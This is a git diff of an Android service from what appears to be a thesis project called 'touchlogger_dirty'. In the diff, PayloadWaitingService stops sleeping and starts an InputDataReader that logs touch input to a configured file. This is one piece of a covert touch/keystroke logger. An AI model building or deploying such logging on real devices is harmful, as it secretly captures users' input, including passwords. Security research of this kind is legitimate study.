@@ -1,11 +1,10 @@
 package org.leyfer.thesis.touchlogger_dirty.service;
 
 import android.app.IntentService;
-import android.content.Context;
 import android.content.Intent;
-import android.widget.Toast;
 
-import org.leyfer.thesis.touchlogger_dirty.R;
+import org.leyfer.thesis.touchlogger_dirty.InputDataReader;
+import org.leyfer.thesis.touchlogger_dirty.utils.Config;
 
 public class PayloadWaitingService extends IntentService {
     private static final String ACTION_WAIT_FOR_PAYLOAD =
@@ -27,10 +26,8 @@ public class PayloadWaitingService extends IntentService {
     }
 
     private void handleActionWaitForPayload() {
-        try {
-            Thread.sleep(PAYLOAD_WAITING_TIME);
-        } catch (InterruptedException e) {
-            e.printStackTrace();
-        }
+        new InputDataReader(
+                Config.TOUCH_DATA_FILE_BASE_NAME, Config.INPUT_DATA_DIR, getApplicationContext()
+        ).start();
     }
 }
